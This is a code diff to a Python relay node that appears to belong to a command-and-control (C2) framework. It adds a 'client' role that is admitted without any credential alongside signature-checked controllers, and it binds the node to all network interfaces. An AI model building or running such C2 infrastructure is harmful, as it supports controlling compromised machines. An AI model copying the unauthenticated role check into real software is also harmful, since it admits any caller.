@@ -11,7 +11,7 @@ from .crypto import Crypto
 from .logger import LoggerFormatter
 
 class Node:
-    def __init__(self, host='172.31.32.225', port=547, debug=True):
+    def __init__(self, host='0.0.0.0', port=547, debug=True):
         self.host = host
         self.port = port
         self.debug = debug
@@ -116,16 +116,16 @@ class Node:
                 self.logger.info(f"Stored client {addr} with ID {client_id}")
 
             # Check if client is C2
-            is_c2 = self.check_c2(client_socket, addr)
+            role = self.check_auth(client_socket, addr)
 
-            if not is_c2:
+            if not role:
                 client_socket.settimeout(10)
 
             # Main loop
             while self.running:
-                if is_c2:
+                if role == "controller":
                     self.process_c2_messages(client_socket, addr)
-                else:
+                elif role == "client":
                     threading.Event().wait(1)
 
         except Exception as e:
@@ -134,7 +134,7 @@ class Node:
             self.disconnect_connection(client_socket, addr)
 
     #  Check C2 
-    def check_c2(self, client_socket, addr):
+    def check_auth(self, client_socket, addr):
         try:
             client_socket.settimeout(2)
             length_bytes = self.receive_bytes(client_socket, 2)
@@ -154,29 +154,34 @@ class Node:
 
             auth_data = json.loads(auth_message.decode())
             self.logger.debug(f"Received auth message from {addr}: {auth_data}")
-            if auth_data.get("role") != "C2":
+
+            if auth_data.get("role") == "C2":
+                signature = bytes.fromhex(auth_data.get("signature", ""))
+                if self.verify_c2_signature(json.dumps({"role": "C2"}).encode(), signature):
+                    self.logger.info(f"C2 authenticated from {addr}")
+                    self.send_confirmation(client_socket, {"status": "success"})
+                    with self.clients_lock:
+                        self.clients.pop(client_socket, None)
+                    return "controller"
+                else:
+                    self.logger.error(f"Invalid C2 signature from {addr}")
+                    self.send_confirmation(client_socket, {"status": "error", "message": "Invalid signature"})
+                    return False
+            elif auth_data.get("role") == "client":
+                self.logger.info(f"Client authenticated from {addr}")
+                self.send_confirmation(client_socket, {"status": "success"})
+                return "client" 
+            else:
                 self.logger.warning(f"Invalid role in auth message from {addr}: {auth_data.get('role')}")
                 self.send_confirmation(client_socket, {"status": "error", "message": "Invalid role"})
                 return False
 
-            signature = bytes.fromhex(auth_data.get("signature", ""))
-            if self.verify_c2_signature(json.dumps({"role": "C2"}).encode(), signature):
-                self.logger.info(f"C2 authenticated from {addr}")
-                self.send_confirmation(client_socket, {"status": "success"})
-                with self.clients_lock:
-                    self.clients.pop(client_socket, None)
-                return True
-            else:
-                self.logger.error(f"Invalid C2 signature from {addr}")
-                self.send_confirmation(client_socket, {"status": "error", "message": "Invalid signature"})
-                return False
-
         except socket.timeout:
-            self.logger.warning(f"C2 auth timeout from {addr}")
+            self.logger.warning(f"Auth timeout from {addr}")
             self.send_confirmation(client_socket, {"status": "error", "message": "Authentication timeout"})
             return False
         except Exception as e:
-            self.logger.error(f"C2 auth failed from {addr}: {type(e).__name__}: {str(e)}")
+            self.logger.error(f"Auth failed from {addr}: {type(e).__name__}: {str(e)}")
             self.send_confirmation(client_socket, {"status": "error", "message": f"Authentication failed: {str(e)}"})
             return False
 
@@ -279,9 +284,9 @@ class Node:
         try:
             message_bytes = json.dumps(message).encode()
             client_socket.send(len(message_bytes).to_bytes(2, 'big') + message_bytes)
-            self.logger.debug(f"Sent confirmation to {self.get_address(client_socket)}: {message}")
+            self.logger.info(f"Sent auth confirmation to {self.get_address(client_socket)}: {message}")
         except Exception as e:
-            self.logger.warning(f"Failed to send confirmation to {self.get_address(client_socket)}: {type(e).__name__}: {str(e)}")
+            self.logger.warning(f"Failed to send auth confirmation to {self.get_address(client_socket)}: {type(e).__name__}: {str(e)}")
 
     #  Send 
     def send_to_all(self, message):
